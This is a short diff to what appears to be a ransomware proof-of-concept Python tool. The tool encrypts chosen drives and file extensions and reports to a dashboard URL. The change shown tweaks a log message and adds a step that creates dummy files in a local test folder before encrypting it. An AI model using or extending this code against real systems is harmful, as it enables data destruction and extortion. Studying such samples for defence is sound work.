@@ -236,11 +236,13 @@ class EncryptionTool:
             logging.info(f"[+] All files in the {directory_path} Encrypted Successfully.")
         except Exception as e:
             # Submit Error Log for files encryption in the Log Console
-            logging.error(f"[-] Failed to encrypt files in {directory_path} => Error: {str(e)}")
+            logging.error(f"[-] Failed to Encrypt files in {directory_path} => Error: {str(e)}")
 
 
 if __name__ == "__main__":
     # Create an instance of the EncryptionTool class
     encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
                                     password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
+    encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
     encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")
+
